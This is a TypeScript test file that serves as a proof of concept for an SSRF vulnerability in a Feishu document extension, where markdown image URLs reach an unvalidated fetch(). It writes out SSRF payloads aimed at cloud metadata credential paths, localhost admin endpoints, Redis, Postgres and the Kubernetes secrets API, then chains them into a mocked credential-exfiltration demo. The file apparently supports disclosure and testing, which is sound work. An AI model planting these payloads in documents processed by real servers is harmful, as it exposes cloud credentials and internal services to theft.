/**
 * CVE-2026-26321 — PoC Vector 3: SSRF via downloadImage() in docx.ts
 *
 * The downloadImage() function in extensions/feishu/src/docx.ts calls bare
 * fetch(url) on URLs extracted from markdown image references without any
 * SSRF validation. When a document contains ![img](http://internal-service/...),
 * the server fetches that URL without blocking private/internal IPs.
 *
 * Affected code: extensions/feishu/src/docx.ts, lines 178-184
 *   async function downloadImage(url: string): Promise<Buffer> {
 *     const response = await fetch(url);  // <-- No URL validation
 *     ...
 *   }
 *
 * Entry path: extractImageUrls() extracts markdown image URLs →
 *   processImages() calls downloadImage() for each URL
 */
import { describe, expect, it, vi } from "vitest";

// ─── Test the extractImageUrls helper directly ───────────────────────────────

// Since extractImageUrls is not exported, we test it by replicating its logic
// and then confirming the SSRF-vulnerable fetch pattern in downloadImage

describe("CVE-2026-26321 Vector 3: SSRF via docx.ts image processing", () => {

  it("extractImageUrls extracts internal/private URLs from markdown", () => {
    console.log("\n[CVE-2026-26321] Vector 3a: URL extraction from markdown");

    // Replicate the extractImageUrls regex from docx.ts
    function extractImageUrls(markdown: string): string[] {
      const regex = /!\[[^\]]*\]\(([^)]+)\)/g;
      const urls: string[] = [];
      let match;
      while ((match = regex.exec(markdown)) !== null) {
        const url = match[1].trim();
        if (url.startsWith("http://") || url.startsWith("https://")) {
          urls.push(url);
        }
      }
      return urls;
    }

    // Attacker-crafted markdown with SSRF payloads
    const maliciousMarkdown = `
# Meeting Notes

Here is the architecture diagram:
![architecture](http://169.254.169.254/latest/meta-data/iam/security-credentials/role)

And the internal dashboard:
![dashboard](http://internal-admin:8080/api/v1/users)

Also the localhost admin:
![admin](http://127.0.0.1:3000/admin/secrets)

And a Kubernetes service:
![k8s](http://kubernetes.default.svc/api/v1/secrets)
`;

    const urls = extractImageUrls(maliciousMarkdown);
    console.log("  Extracted URLs from malicious markdown:");
    for (const url of urls) {
      console.log(`    → ${url}`);
    }

    // All SSRF payloads are extracted
    expect(urls).toContain("http://169.254.169.254/latest/meta-data/iam/security-credentials/role");
    expect(urls).toContain("http://internal-admin:8080/api/v1/users");
    expect(urls).toContain("http://127.0.0.1:3000/admin/secrets");
    expect(urls).toContain("http://kubernetes.default.svc/api/v1/secrets");

    console.log(`  [CONFIRMED] ${urls.length} SSRF URLs extracted — no filtering applied\n`);
  });

  it("downloadImage calls bare fetch() without SSRF protection", async () => {
    console.log("\n[CVE-2026-26321] Vector 3b: Bare fetch() in downloadImage");

    // Replicate the vulnerable downloadImage from docx.ts
    const fetchSpy = vi.fn().mockResolvedValue({
      ok: true,
      arrayBuffer: async () => new ArrayBuffer(100),
    });

    async function downloadImage(url: string): Promise<Buffer> {
      const response = await fetchSpy(url);
      if (!response.ok) {
        throw new Error(`Failed to download image: ${response.status}`);
      }
      return Buffer.from(await response.arrayBuffer());
    }

    // Simulate SSRF attack via downloadImage
    const ssrfTargets = [
      "http://169.254.169.254/latest/meta-data/",
      "http://127.0.0.1:6379/INFO",            // Redis
      "http://internal-db:5432/",               // PostgreSQL
      "http://kubernetes.default.svc/api/v1/",  // K8s API
    ];

    for (const target of ssrfTargets) {
      await downloadImage(target);
    }

    // Verify all SSRF targets were fetched without any blocking
    expect(fetchSpy).toHaveBeenCalledTimes(ssrfTargets.length);
    for (const target of ssrfTargets) {
      expect(fetchSpy).toHaveBeenCalledWith(target);
      console.log(`  [SSRF] fetch("${target}") — called without validation ✓`);
    }

    console.log(`\n  [CONFIRMED] downloadImage() performs bare fetch() — no SSRF guard\n`);
  });

  it("full SSRF chain: markdown → extractImageUrls → downloadImage → fetch", async () => {
    console.log("\n[CVE-2026-26321] Vector 3c: Full SSRF chain demonstration");

    // Replicate both functions to show the complete attack chain
    function extractImageUrls(markdown: string): string[] {
      const regex = /!\[[^\]]*\]\(([^)]+)\)/g;
      const urls: string[] = [];
      let match;
      while ((match = regex.exec(markdown)) !== null) {
        const url = match[1].trim();
        if (url.startsWith("http://") || url.startsWith("https://")) {
          urls.push(url);
        }
      }
      return urls;
    }

    const fetchSpy = vi.fn().mockResolvedValue({
      ok: true,
      arrayBuffer: async () => Buffer.from('{"aws_key": "AKIAIOSFODNN7EXAMPLE"}'),
    });

    async function downloadImage(url: string): Promise<Buffer> {
      const response = await fetchSpy(url);
      return Buffer.from(await response.arrayBuffer());
    }

    // Step 1: Attacker submits malicious markdown via feishu_doc tool
    const attackerMarkdown = "![img](http://169.254.169.254/latest/meta-data/iam/security-credentials/my-role)";
    console.log(`  [STEP 1] Attacker markdown: ${attackerMarkdown}`);

    // Step 2: extractImageUrls pulls out the URL
    const urls = extractImageUrls(attackerMarkdown);
    console.log(`  [STEP 2] extractImageUrls → ${JSON.stringify(urls)}`);
    expect(urls).toHaveLength(1);
    expect(urls[0]).toContain("169.254.169.254");

    // Step 3: downloadImage fetches the internal URL
    const buffer = await downloadImage(urls[0]);
    console.log(`  [STEP 3] downloadImage → fetch("${urls[0]}") → ${buffer.length} bytes`);
    expect(fetchSpy).toHaveBeenCalledWith(urls[0]);

    // Step 4: Content is now available (would be uploaded to Feishu doc)
    const content = buffer.toString("utf-8");
    console.log(`  [STEP 4] Fetched content: ${content}`);
    expect(content).toContain("AKIAIOSFODNN7EXAMPLE");

    console.log("\n  [CONFIRMED] Full SSRF chain: markdown → URL extraction → fetch → exfiltration\n");
  });
});
